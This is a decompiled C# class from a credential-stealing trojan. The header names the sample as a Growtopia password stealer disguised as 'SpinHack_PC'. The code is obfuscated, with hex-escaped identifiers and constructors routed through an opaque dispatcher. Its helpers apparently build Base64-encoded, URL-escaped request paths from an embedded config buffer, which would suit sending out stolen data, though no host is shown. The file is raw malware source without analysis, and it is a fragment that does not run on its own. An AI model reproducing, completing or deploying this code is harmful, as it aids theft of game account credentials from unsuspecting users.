// Decompiled with JetBrains decompiler
// Type: 26E441B6
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;
using System.Reflection;
using System.Text;

public class \u00326E441B6
{
  private readonly byte[] \u00318DE4877;
  private byte[] \u003540C2DE0;
  private readonly object \u003079B6DF0;
  private \u0037102742F \u00324CE354E;
  private long \u0034C72354B;
  private readonly int \u003176564D5;
  private int \u003044125F7;
  private uint \u0033B525C7B;

  public \u00326E441B6(long _param1) => new \u0037BA67F86().\u00313FD286A(new object[2]
  {
    (object) this,
    (object) _param1
  }, 408748);

  public \u00326E441B6(byte[] _param1) => new \u0037BA67F86().\u00313FD286A(new object[2]
  {
    (object) this,
    (object) _param1
  }, 272506);

  public class \u0033E046393
  {
    protected bool \u003352D7CBA(byte[] _param1)
    {
      int int32_1 = BitConverter.ToInt32(_param1, 32);
      if (int32_1 == 0)
        return false;
      int int32_2 = BitConverter.ToInt32(_param1, 28);
      this.\u0035EBD6668 = Encoding.UTF8.GetString(_param1, int32_2, int32_1);
      if (this.\u0035EBD6668[this.\u0035EBD6668.Length - 1] != '/')
        this.\u0035EBD6668 += "/";
      return true;
    }

    protected void \u00327753FD5() => this.\u0035EBD6668 = Convert.ToBase64String(Encoding.UTF8.GetBytes(this.\u0035EBD6668));

    protected void \u00316EF3321(string _param1, string _param2)
    {
      this.\u003337B4749(_param1, false);
      this.\u003337B4749(_param2, true);
    }

    private void \u003337B4749(string _param1, bool _param2)
    {
      if (_param2)
      {
        StringBuilder stringBuilder = new StringBuilder(this.\u0035EBD6668);
        foreach (char ch in _param1)
        {
          switch (ch)
          {
            case '+':
              stringBuilder.Append("%2B");
              break;
            case '/':
              stringBuilder.Append("%2F");
              break;
            case '=':
              stringBuilder.Append("%3D");
              break;
            default:
              stringBuilder.Append(ch);
              break;
          }
        }
        this.\u0035EBD6668 = stringBuilder.ToString();
      }
      else
        this.\u0035EBD6668 += _param1;
    }

    public string \u0035EBD6668 { get; private set; }

    public string \u0035B96632E { get; private set; }

    public static unsafe object \u00339C57DF1(void* _param0) => Pointer.Box(_param0, typeof (void*));

    public static unsafe void* \u0031DF0789C(object _param0) => Pointer.Unbox(_param0);
  }

  public class \u00333EE7445 : \u00326E441B6.\u0033E046393
  {
    string \u00323223B1C { }
  }

  public class \u003396C70EE : \u00326E441B6.\u0033E046393
  {
  }
}
